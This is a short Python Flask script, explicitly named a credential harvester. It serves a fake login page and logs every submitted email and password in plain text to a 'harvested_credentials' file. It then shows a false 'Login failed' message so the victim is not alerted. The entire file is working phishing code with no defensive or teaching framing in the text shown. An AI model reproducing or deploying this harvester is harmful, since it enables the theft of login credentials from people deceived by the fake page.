from flask import Flask, request, render_template
import logging

app = Flask(__name__)

# Setup logging
logging.basicConfig(filename='logs/harvested_credentials.log', level=logging.INFO)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        logging.info(f"Captured credentials - Email: {email}, Password: {password}")
        return "Login failed. Please try again."
    return render_template('login.html')

def run_harvester():
    print("[+] Starting credential harvester at http://localhost:5001")
    app.run(port=5001)
